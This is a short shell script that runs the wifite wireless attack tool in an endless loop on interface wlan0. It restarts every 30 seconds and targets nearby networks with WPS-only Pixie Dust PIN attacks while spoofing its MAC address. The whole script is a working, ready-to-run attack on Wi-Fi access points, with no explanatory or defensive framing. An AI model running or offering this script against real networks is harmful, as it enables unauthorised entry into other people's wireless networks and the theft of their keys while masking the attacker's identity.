#!/bin/sh
while (true)
do
sleep 30 && killall -w wifite & wifite -i wlan0 -p 5 -mac --wps --wps-only --pixie --wps-fails 1 --wps-timeouts 1 --wps-time 6;
sleep 5;
done;
